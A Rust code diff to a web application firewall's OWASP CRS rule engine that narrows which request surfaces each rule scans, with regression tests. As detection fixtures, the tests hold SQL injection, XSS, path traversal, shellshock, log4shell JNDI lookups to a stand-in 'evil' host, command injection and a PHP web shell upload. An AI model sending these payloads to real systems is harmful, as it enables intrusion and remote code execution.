@@ -400,6 +400,75 @@ impl LoadSummary {
 
 // ── Request fields ────────────────────────────────────────────────────────────
 
+/// The set of request surfaces a multi-variable CRS rule scans.
+///
+/// CRS rules routinely name several `ModSecurity` variables at once
+/// (`REQUEST_COOKIES|ARGS_NAMES|ARGS|XML:/*`).  The engine has no union
+/// operator over the single-surface fields, and collapsing every such rule
+/// onto one catch-all field is what produced this check's worst false
+/// positives: a rule that reads cookies and arguments would also be run
+/// against every request header value, and CRS patterns are not written with
+/// that in mind.  Two live examples from the shipped set:
+///
+/// * CRS-933150 matches the PHP function name `urlencode`, which is a
+///   substring of `Content-Type: application/x-www-form-urlencoded` — every
+///   ordinary HTML form POST.
+/// * CRS-941130 matches `xhtml`, which is a substring of the `Accept` header
+///   every browser sends.
+///
+/// So the surfaces are carried explicitly and only the ones the upstream rule
+/// asked for are walked.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+struct Surfaces(u8);
+
+impl Surfaces {
+    const PATH: u8 = 1 << 0;
+    const QUERY: u8 = 1 << 1;
+    const BODY: u8 = 1 << 2;
+    const COOKIES: u8 = 1 << 3;
+    /// Every request header **value**.  Header *names* are only scanned by
+    /// [`Field::Headers`], whose upstream (`REQUEST_HEADERS_NAMES`) asks for
+    /// them explicitly.
+    const HEADER_VALUES: u8 = 1 << 4;
+    const USER_AGENT: u8 = 1 << 5;
+    const REFERER: u8 = 1 << 6;
+
+    /// Canonical order — also the order surface names appear in a field name.
+    const NAMED: [(&'static str, u8); 7] = [
+        ("path", Self::PATH),
+        ("query", Self::QUERY),
+        ("body", Self::BODY),
+        ("cookies", Self::COOKIES),
+        ("headers", Self::HEADER_VALUES),
+        ("user_agent", Self::USER_AGENT),
+        ("referer", Self::REFERER),
+    ];
+
+    /// What the bare field name `all` means: the whole request.
+    const ALL: Self = Self(Self::PATH | Self::QUERY | Self::BODY | Self::COOKIES | Self::HEADER_VALUES);
+
+    const fn has(self, bit: u8) -> bool {
+        self.0 & bit != 0
+    }
+
+    /// Parse a `+`-joined surface list (`"query+body+cookies"`).
+    ///
+    /// Returns `None` for an unknown surface name or a duplicate, so a typo in
+    /// a rule file is rejected at load time instead of quietly scanning less
+    /// than the rule says.
+    fn parse(name: &str) -> Option<Self> {
+        let mut bits = 0u8;
+        for token in name.split('+') {
+            let (_, bit) = Self::NAMED.iter().find(|(n, _)| *n == token)?;
+            if bits & bit != 0 {
+                return None;
+            }
+            bits |= bit;
+        }
+        (bits != 0).then_some(Self(bits))
+    }
+}
+
 /// A request location a CRS rule can be evaluated against.
 ///
 /// Every variant is backed by a real accessor, so a rule that compiles is
@@ -407,8 +476,8 @@ impl LoadSummary {
 /// ([`RejectReason::UnsupportedField`]) rather than silently never matching.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 enum Field {
-    /// Path, query, request body and every request header value.
-    All,
+    /// Several request surfaces at once; `all` is the full set.
+    Multi(Surfaces),
     Method,
     Path,
     Query,
@@ -443,7 +512,7 @@ enum Field {
 impl Field {
     fn parse(name: &str) -> Option<Self> {
         Some(match name {
-            "all" => Self::All,
+            "all" => Self::Multi(Surfaces::ALL),
             "method" => Self::Method,
             "path" => Self::Path,
             "query" => Self::Query,
@@ -458,6 +527,10 @@ impl Field {
             "header_referer" => Self::HeaderReferer,
             "header_host" => Self::HeaderHost,
             "header_range" => Self::HeaderRange,
+            // Composite surface list, e.g. `query+body+cookies`.  Requires a
+            // `+` so a single-surface rule keeps using its dedicated field and
+            // there is exactly one spelling per meaning.
+            multi if multi.contains('+') => Self::Multi(Surfaces::parse(multi)?),
             _ => return None,
         })
     }
@@ -465,7 +538,7 @@ impl Field {
     /// `false` for fields that expand to several values; scalar comparisons
     /// (`equals` / `not_in` / `gt` / `lt`) are not meaningful on those.
     const fn is_scalar(self) -> bool {
-        !matches!(self, Self::All | Self::Headers | Self::Cookies)
+        !matches!(self, Self::Multi(_) | Self::Headers | Self::Cookies)
     }
 
     /// The single value of a scalar field, or `None` for multi-valued fields
@@ -491,7 +564,7 @@ impl Field {
                 let count = ctx.query.split('&').filter(|s| !s.is_empty()).count();
                 Some(Cow::Owned(count.to_string()))
             }
-            Self::All | Self::Headers | Self::Cookies => None,
+            Self::Multi(_) | Self::Headers | Self::Cookies => None,
         }
     }
 
@@ -499,11 +572,15 @@ impl Field {
     /// first `true`.
     fn any_value(self, ctx: &RequestCtx, mut f: impl FnMut(&str) -> bool) -> bool {
         match self {
-            Self::All => {
-                f(&ctx.path)
-                    || f(&ctx.query)
-                    || f(&String::from_utf8_lossy(&ctx.body_preview))
-                    || ctx.headers.values().any(|v| f(v))
+            Self::Multi(s) => {
+                let header = |name: &str, f: &mut dyn FnMut(&str) -> bool| ctx.headers.get(name).is_some_and(|v| f(v));
+                (s.has(Surfaces::PATH) && f(&ctx.path))
+                    || (s.has(Surfaces::QUERY) && f(&ctx.query))
+                    || (s.has(Surfaces::BODY) && f(&String::from_utf8_lossy(&ctx.body_preview)))
+                    || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(&mut f))
+                    || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| f(v)))
+                    || (s.has(Surfaces::USER_AGENT) && header("user-agent", &mut f))
+                    || (s.has(Surfaces::REFERER) && header("referer", &mut f))
             }
             Self::Headers => ctx.headers.iter().any(|(name, value)| f(name) || f(value)),
             Self::Cookies => cookie_values(ctx).any(&mut f),
@@ -610,8 +687,8 @@ impl CompiledRule {
 
     /// Run a libinjection detector against the appropriate request fields.
     ///
-    /// For the `all` field, scans path, query, body, and header values
-    /// (matching CRS behavior for libinjection rules).  Each value is tested
+    /// For a composite field, scans exactly the surfaces it names (`all` being
+    /// the whole request, matching CRS behavior for libinjection rules).  Each value is tested
     /// in raw form, single-decoded form, and recursively-decoded form (up to
     /// [`super::MAX_DECODE_PASSES`] passes, currently 5) to catch `%`-encoded
     /// and double/triple-encoded evasion attempts.
@@ -631,14 +708,19 @@ impl CompiledRule {
             recursive != decoded && detector(recursive.as_bytes())
         };
 
-        if self.field == Field::All {
+        if let Field::Multi(s) = self.field {
             // The raw byte body is additionally tested unmodified, because the
             // lossy UTF-8 conversion can destroy a binary payload.
-            return detect_with_decode(&ctx.path)
-                || detect_with_decode(&ctx.query)
-                || detector(&ctx.body_preview)
-                || detect_with_decode(&String::from_utf8_lossy(&ctx.body_preview))
-                || ctx.headers.values().any(|v| detect_with_decode(v));
+            let header = |name: &str| ctx.headers.get(name).is_some_and(|v| detect_with_decode(v));
+            return (s.has(Surfaces::PATH) && detect_with_decode(&ctx.path))
+                || (s.has(Surfaces::QUERY) && detect_with_decode(&ctx.query))
+                || (s.has(Surfaces::BODY)
+                    && (detector(&ctx.body_preview)
+                        || detect_with_decode(&String::from_utf8_lossy(&ctx.body_preview))))
+                || (s.has(Surfaces::COOKIES) && cookie_values(ctx).any(detect_with_decode))
+                || (s.has(Surfaces::HEADER_VALUES) && ctx.headers.values().any(|v| detect_with_decode(v)))
+                || (s.has(Surfaces::USER_AGENT) && header("user-agent"))
+                || (s.has(Surfaces::REFERER) && header("referer"));
         }
         self.field.any_value(ctx, detect_with_decode)
     }
@@ -1760,46 +1842,79 @@ rules:
 
         assert!(summary.source_errors.is_empty(), "shipped rule set must parse cleanly");
         assert_eq!(summary.attempted, 328, "declared CRS rules");
-        assert_eq!(summary.compiled, 224, "enforceable CRS rules");
+        assert_eq!(summary.compiled, 215, "enforceable CRS rules");
         assert_eq!(checker.rule_count(), summary.compiled);
         assert_eq!(summary.attempted, summary.compiled + summary.rejected.len());
 
-        // Everything not enforced is either a response-phase rule (needs a
-        // response inspection hook this architecture does not have) or a
-        // scalar operator applied to a collection field.
-        //
-        // 99 `response_body` + 3 `response_status`: the CRS 95x block is
-        // response-phase in its entirety.  Two conversions of that block ship
-        // side by side (the `CRS-95xxxx` files produced by the current
-        // `modsec2yaml.py`, and the older `CRS-RESP-95xxxx` `response-*.yaml`
-        // files), so most 95x rules appear twice.
-        assert_eq!(summary.rejected_field_count(), 102, "response-phase rules");
+        // Nothing is enforced in a form the upstream rule would not recognise.
+        // Every rejection names the `ModSecurity` construct this engine cannot
+        // evaluate, so the startup WARN doubles as the "not supported yet"
+        // inventory.  Re-syncing CRS is expected to move these numbers.
+        let by_field = |name: &str| {
+            summary
+                .rejected
+                .iter()
+                .filter(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == name))
+                .count()
+        };
+        // The CRS 95x block is response-phase in its entirety, and two
+        // conversions of it ship side by side (the `CRS-95xxxx` files produced
+        // by the current `modsec2yaml.py` and the older `CRS-RESP-95xxxx`
+        // `response-*.yaml` files), so most 95x rules appear twice.
+        assert_eq!(by_field("response_body"), 99, "RESPONSE_BODY");
+        assert_eq!(by_field("response_status"), 3, "RESPONSE_STATUS / RESPONSE_PROTOCOL");
+        // `FILES` / `FILES_NAMES` / `REQUEST_HEADERS:X-Filename`: uploaded file
+        // names.  CRS-933110 and CRS-944140 test them with `.*\.php$` style
+        // patterns, so running them over the whole request blocked every
+        // request to a `.php` or `.jsp` URL.
+        assert_eq!(by_field("unmapped_files"), 5, "CRS 932180/933110/933111/933220/944140");
+        // `MULTIPART_PART_HEADERS`: the headers of each multipart part.  The
+        // engine sees the raw body, not parsed parts.
+        assert_eq!(
+            by_field("unmapped_multipart_part_headers"),
+            2,
+            "CRS-922120 / CRS-922130"
+        );
+        // `&REQUEST_HEADERS:Range` is a *count*, not a value.
+        assert_eq!(by_field("unmapped_count_request_headers_range"), 1, "CRS-921230");
+        // CRS-942130 / CRS-942131 only mean anything with their chained
+        // `TX:1 @streq %{TX.2}` capture comparison; without it they reduce to
+        // "block any `word = word`".
+        assert_eq!(
+            by_field("unmapped_chained_capture_equality"),
+            2,
+            "CRS-942130 / CRS-942131"
+        );
+        assert_eq!(summary.rejected_field_count(), 112, "rules the engine cannot evaluate");
         assert!(
             summary
                 .rejected
                 .iter()
                 .filter(|r| r.reason.category() == RejectCategory::UnsupportedField)
                 .all(|r| matches!(&r.reason, RejectReason::UnsupportedField(f)
-                    if f == "response_body" || f == "response_status")),
-            "the only unsupported fields left are the response-phase ones"
-        );
-        assert_eq!(
-            summary
-                .rejected
-                .iter()
-                .filter(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == "response_status"))
-                .count(),
-            3,
-            "CRS-950100 / CRS-RESP-950100 / CRS-RESP-954130 test RESPONSE_STATUS"
+                    if f.starts_with("response_") || f.starts_with("unmapped_"))),
+            "an unsupported field must be a response-phase or unmapped-variable marker"
         );
         assert_eq!(
             summary.rejected_operator_count(),
             0,
             "all CRS operators are implemented"
         );
-        assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 2);
+        // CRS-921250 applies `@streq` to `REQUEST_COOKIES`, a collection.
+        assert_eq!(summary.count(RejectCategory::FieldOperatorMismatch), 1);
         assert_eq!(summary.count(RejectCategory::InvalidValue), 0);
         assert_eq!(summary.count(RejectCategory::DataFile), 0, "every wordlist must load");
+
+        // `all` walks every request header value, so it is reserved for the
+        // rules whose upstream variable list really is the whole request.  The
+        // rest name the surfaces they read.  If a re-sync pushes this back up,
+        // the converter's surface mapping has regressed.
+        let catch_all = checker
+            .rules
+            .iter()
+            .filter(|r| r.field == Field::Multi(Surfaces::ALL))
+            .count();
+        assert_eq!(catch_all, 6, "rules scanning the entire request");
 
         // No rule from the response-phase conversion may end up enforced: their
         // patterns describe server *output* and matching them against a request
@@ -1814,6 +1929,456 @@ rules:
             leaked.is_empty(),
             "response-phase rules must not be enforced: {leaked:?}"
         );
+    }
+
+    /// A request built from parts, for probing the shipped rule set the way a
+    /// real client would exercise it.
+    fn probe(method: &str, path: &str, query: &str, headers: &[(&str, &str)], body: &str, paranoia: u8) -> RequestCtx {
+        let mut ctx = make_ctx(method, path, body.len() as u64);
+        ctx.query = query.into();
+        ctx.body_preview = Bytes::copy_from_slice(body.as_bytes());
+        for (name, value) in headers {
+            ctx.headers.insert((*name).into(), (*value).into());
+        }
+        let dc = DefenseConfig {
+            owasp_set: true,
+            owasp_paranoia: paranoia,
+            ..DefenseConfig::default()
+        };
+        ctx.host_config = Arc::new(HostConfig {
+            code: "test".into(),
+            host: "example.com".into(),
+            defense_config: dc,
+            ..HostConfig::default()
+        });
+        ctx
+    }
+
+    /// The headers an ordinary browser sends.
+    fn browser_headers() -> Vec<(&'static str, &'static str)> {
+        vec![
+            (
+                "user-agent",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
+            ),
+            (
+                "accept",
+                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            ),
+            ("accept-encoding", "gzip, deflate, br, zstd"),
+            ("accept-language", "en-GB,en;q=0.9"),
+            ("referer", "https://shop.example.com/products?page=2&sort=price"),
+            ("cookie", "session=8f3ab21c9de4; locale=en_GB; cart_items=3"),
+        ]
+    }
+
+    const MULTIPART_UPLOAD: &str = "------WebKitFormBoundaryABC\r\n\
+Content-Disposition: form-data; name=\"file\"; filename=\"quarterly-report.pdf\"\r\n\
+Content-Type: application/pdf\r\n\r\n\
+%PDF-1.4 quarterly figures\r\n\
+------WebKitFormBoundaryABC--\r\n";
+
+    /// Ordinary traffic that the shipped CRS conversion used to block.
+    ///
+    /// Every entry here was verified to be blocked before the variable mapping
+    /// was corrected, and the rule that blocked it is named.  The common cause
+    /// was a `ModSecurity` variable the converter did not recognise, or a
+    /// narrow one it widened: the rule then ran against request surfaces its
+    /// pattern was never written for.
+    #[test]
+    fn crs_conversion_does_not_block_ordinary_traffic() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+        let browser = browser_headers();
+        let form = [
+            ("content-type", "application/x-www-form-urlencoded"),
+            ("cookie", "session=8f3ab21c9de4"),
+        ];
+
+        let cases: Vec<(&str, RequestCtx)> = vec![
+            // CRS-933150 matches the PHP function name `urlencode`, and
+            // `application/x-www-form-urlencoded` contains it: with the rule on
+            // a field that walks header values, every HTML form POST was
+            // blocked at the default paranoia level.
+            (
+                "urlencoded form POST",
+                probe(
+                    "POST",
+                    "/account/settings",
+                    "",
+                    &form,
+                    "display_name=Jo+Smith&api_key=k_live_9f2&timezone=Europe%2FLondon",
+                    1,
+                ),
+            ),
+            // CRS-941130 matches `xhtml`, which every browser sends in `Accept`.
+            (
+                "plain browser page view",
+                probe("GET", "/products/laptop-pro-14", "page=2&sort=price", &browser, "", 1),
+            ),
+            // CRS-933110 / CRS-944140 test *uploaded file names* for a script
+            // extension.  Run over the whole request they matched the URL path.
+            (
+                "GET a .php URL",
+                probe("GET", "/wp-admin/admin-ajax.php", "action=heartbeat", &browser, "", 1),
+            ),
+            (
+                "GET a .phtml URL",
+                probe("GET", "/app/legacy.phtml", "", &browser, "", 1),
+            ),
+            (
+                "GET a .jsp URL",
+                probe("GET", "/portal/dashboard.jsp", "tab=1", &browser, "", 1),
+            ),
+            (
+                "Referer pointing at a .php page",
+                probe("GET", "/", "", &[("referer", "https://shop.example/cart.php")], "", 1),
+            ),
+            // CRS-922130 reads `MULTIPART_PART_HEADERS`; over the whole request
+            // its pattern reduces to "whitespace, a word, a colon".
+            (
+                "shebang + YAML request body",
+                probe("POST", "/api/save", "", &[], "#!/opt/app/runner\nname: demo", 1),
+            ),
+            (
+                "Ruby error text in a log payload",
+                probe(
+                    "POST",
+                    "/api/log",
+                    "",
+                    &[],
+                    "log=undefined method `foo' for nil:NilClass",
+                    1,
+                ),
+            ),
+            (
+                "legitimate multipart file upload",
+                probe(
+                    "POST",
+                    "/upload",
+                    "",
+                    &[(
+                        "content-type",
+                        "multipart/form-data; boundary=----WebKitFormBoundaryABC",
+                    )],
+                    MULTIPART_UPLOAD,
+                    1,
+                ),
+            ),
+            // CRS-932180 tests uploaded file names against restricted-upload.data,
+            // which lists `.env`; the raw body is not a file name.
+            (
+                "documentation mentioning .env keys",
+                probe(
+                    "POST",
+                    "/api/docs",
+                    "",
+                    &[("content-type", "text/plain")],
+                    "Set APP_KEY= and DB_PASSWORD= in your .env before booting",
+                    1,
+                ),
+            ),
+            (
+                "JSON API request",
+                probe(
+                    "POST",
+                    "/api/v2/orders",
+                    "",
+                    &[
+                        ("content-type", "application/json"),
+                        ("authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.e30.sig"),
+                    ],
+                    "{\"items\":[{\"sku\":\"AB-12\",\"qty\":2}],\"note\":\"leave at door\"}",
+                    1,
+                ),
+            ),
+            // CRS-921230 counts `Range` headers; as a value test it never fired,
+            // but the count is not expressible either way.
+            (
+                "byte-range media request",
+                probe("GET", "/media/clip.mp4", "", &[("range", "bytes=1024-2047")], "", 3),
+            ),
+            // CRS-942130 without its chained `TX:1 @streq %{TX.2}` reduces to
+            // "block any `word = word`".
+            (
+                "template placeholder in a body",
+                probe("POST", "/api/render", "", &[], "tpl=hello #{name}", 2),
+            ),
+            (
+                "ordinary key/value query string",
+                probe("GET", "/search", "sort=price&view=grid", &[], "", 2),
+            ),
+        ];
+
+        for (label, ctx) in &cases {
+            assert!(
+                checker.check(ctx).is_none(),
+                "{label} must not be blocked, got {:?}",
+                checker.check(ctx).and_then(|d| d.rule_id)
+            );
+        }
+    }
+
+    /// The narrowed fields must not cost detection: each payload is placed on a
+    /// surface the upstream CRS rule genuinely reads.
+    #[test]
+    fn crs_conversion_still_detects_attacks_on_every_surface() {
+        let checker = OWASPCheck::from_directory(&crs_dir());
+
+        let cases: Vec<(&str, RequestCtx)> = vec![
+            (
+                "sqli in query string",
+                probe("GET", "/list", "id=1' OR '1'='1", &[], "", 1),
+            ),
+            (
+                "sqli in urlencoded POST body",
+                probe(
+                    "POST",
+                    "/login",
+                    "",
+                    &[("content-type", "application/x-www-form-urlencoded")],
+                    "user=admin%27+OR+1%3D1--+&pw=x",
+                    1,
+                ),
+            ),
+            (
+                "sqli union in a JSON body",
+                probe(
+                    "POST",
+                    "/api/q",
+                    "",
+                    &[("content-type", "application/json")],
+                    "{\"q\":\"1 UNION SELECT password FROM users\"}",
+                    1,
+                ),
+            ),
+            (
+                "xss in query string",
+                probe("GET", "/s", "q=<script>alert(1)</script>", &[], "", 1),
+            ),
+            (
+                "xss in a POST body",
+                probe(
+                    "POST",
+                    "/comment",
+                    "",
+                    &[("content-type", "application/x-www-form-urlencoded")],
+                    "text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+                    1,
+                ),
+            ),
+            (
+                "xss in a cookie value",
+                probe("GET", "/", "", &[("cookie", "theme=<script>alert(1)</script>")], "", 1),
+            ),
+            (
+                "path traversal in query",
+                probe("GET", "/download", "f=../../../../etc/passwd", &[], "", 1),
+            ),
+            (
+                "path traversal in body",
+                probe("POST", "/render", "", &[], "tpl=../../../../etc/passwd", 1),
+            ),
+            (
+                "shellshock in User-Agent",
+                probe(
+                    "GET",
+                    "/cgi-bin/x",
+                    "",
+                    &[("user-agent", "() { :;}; /bin/bash -c 'id'")],
+                    "",
+                    1,
+                ),
+            ),
+            (
+                "log4shell in a header",
+                probe("GET", "/", "", &[("x-api-version", "${jndi:ldap://evil/a}")], "", 1),
+            ),
+            (
+                "log4shell in a cookie",
+                probe("GET", "/", "", &[("cookie", "sid=${jndi:ldap://evil/a}")], "", 1),
+            ),
+            (
+                "rce in a POST body",
+                probe("POST", "/run", "", &[], "cmd=;/bin/cat /etc/passwd", 1),
+            ),
+            (
+                "php web shell uploaded through multipart",
+                probe(
+                    "POST",
+                    "/upload",
+                    "",
+                    &[(
+                        "content-type",
+                        "multipart/form-data; boundary=----WebKitFormBoundaryABC",
+                    )],
+                    "------WebKitFormBoundaryABC\r\n\
+Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n\
+<?php system($_GET['c']); ?>\r\n\
+------WebKitFormBoundaryABC--\r\n",
+                    1,
+                ),
+            ),
+            (
+                "scanner user-agent",
+                probe("GET", "/", "", &[("user-agent", "Nikto/2.1.6")], "", 1),
+            ),
+            (
+                "unix shell payload in Referer",
+                probe("GET", "/", "", &[("referer", "http://x/?a=;cat /etc/passwd")], "", 2),
+            ),
+            (
+                "os file name in Referer",
+                probe("GET", "/", "", &[("referer", "/etc/shadow")], "", 2),
+            ),
+        ];
+
+        for (label, ctx) in &cases {
+            let hit = checker.check(ctx);
+            assert!(hit.is_some(), "{label} must still be detected");
+        }
+    }
+
+    /// `rules/modsecurity/response-checks.yaml` describes response bodies.  It
+    /// is not on the load path today, but if it ever is, none of it may run
+    /// against a request: MODSEC-RESP-006 alone would block every form POST
+    /// carrying an `api_key=` parameter.
+    #[test]
+    fn shipped_response_checks_are_inert_and_response_phase() {
+        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/modsecurity/response-checks.yaml");
+        let checker = OWASPCheck::from_file_or_default(&path);
+        let summary = checker.load_summary();
+
+        assert_eq!(summary.attempted, 12, "declared response-phase rules");
+        assert_eq!(
+            summary.compiled, 0,
+            "no response-phase rule may be enforced on a request"
+        );
+        assert!(
+            summary
+                .rejected
+                .iter()
+                .all(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == "response_body")),
+            "every rejection must name the response field"
+        );
+
+        for (label, ctx) in [
+            (
+                "form POST carrying an api key",
+                probe(
+                    "POST",
+                    "/settings",
+                    "",
+                    &[("content-type", "application/x-www-form-urlencoded")],
+                    "api_key=abc123&app_key=def456",
+                    1,
+                ),
+            ),
+            (
+                "git config pasted into a note",
+                probe(
+                    "POST",
+                    "/api/notes",
+                    "",
+                    &[],
+                    "[core]\n\trepositoryformatversion = 0\n",
+                    1,
+                ),
+            ),
+            (
+                "python traceback in a bug report",
+                probe(
+                    "POST",
+                    "/api/bugs",
+                    "",
+                    &[],
+                    "Traceback (most recent call last):\n  File \"app.py\", line 3",
+                    2,
+                ),
+            ),
+        ] {
+            assert!(checker.check(&ctx).is_none(), "{label} must not be blocked");
+        }
+    }
+
+    // ── Surface fields ────────────────────────────────────────────────────────
+
+    #[test]
+    fn surface_lists_parse_in_any_order_and_reject_junk() {
+        assert_eq!(Field::parse("all"), Some(Field::Multi(Surfaces::ALL)));
+        assert_eq!(Field::parse("query+body"), Field::parse("body+query"));
+        assert_eq!(
+            Field::parse("path+query+body+cookies+headers"),
+            Some(Field::Multi(Surfaces::ALL)),
+            "the full surface list is exactly `all`"
+        );
+        // A repeated or unknown surface is a typo, not a narrower rule.
+        assert_eq!(Field::parse("query+query"), None);
+        assert_eq!(Field::parse("query+banana"), None);
+        assert_eq!(Field::parse("query+"), None);
+        // A sentinel field is never accepted, whatever variable it names.
+        for sentinel in [
+            "unmapped_files",
+            "unmapped_multipart_part_headers",
+            "unmapped_count_request_headers_range",
+            "unmapped_chained_capture_equality",
+        ] {
+            assert_eq!(Field::parse(sentinel), None, "{sentinel} must stay unevaluable");
+        }
+    }
+
+    #[test]
+    fn a_surface_list_scans_only_the_surfaces_it_names() {
+        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query+cookies", "contains", "'needle'"));
+        assert_eq!(checker.rule_count(), 1);
+
+        assert!(
+            checker.check(&probe("GET", "/", "a=needle", &[], "", 1)).is_some(),
+            "query"
+        );
+        assert!(
+            checker
+                .check(&probe("GET", "/", "", &[("cookie", "x=needle")], "", 1))
+                .is_some(),
+            "cookies"
+        );
+        // Surfaces the field does not name must be left alone.
+        assert!(
+            checker.check(&probe("GET", "/needle", "", &[], "", 1)).is_none(),
+            "path"
+        );
+        assert!(
+            checker.check(&probe("POST", "/", "", &[], "needle", 1)).is_none(),
+            "body"
+        );
+        assert!(
+            checker
+                .check(&probe("GET", "/", "", &[("x-thing", "needle")], "", 1))
+                .is_none(),
+            "header value"
+        );
+    }
+
+    #[test]
+    fn user_agent_and_referer_surfaces_do_not_leak_into_other_headers() {
+        let checker = OWASPCheck::from_yaml(&single_rule_yaml("user_agent+referer", "contains", "'needle'"));
+        assert_eq!(checker.rule_count(), 1);
+
+        for header in ["user-agent", "referer"] {
+            assert!(
+                checker
+                    .check(&probe("GET", "/", "", &[(header, "needle")], "", 1))
+                    .is_some(),
+                "{header} must be scanned"
+            );
+        }
+        for header in ["accept", "x-forwarded-for", "cookie"] {
+            assert!(
+                checker
+                    .check(&probe("GET", "/", "", &[(header, "needle")], "", 1))
+                    .is_none(),
+                "{header} must not be scanned"
+            );
+        }
     }
 
     /// Regression guard for the response-phase mislabelling: these bodies are
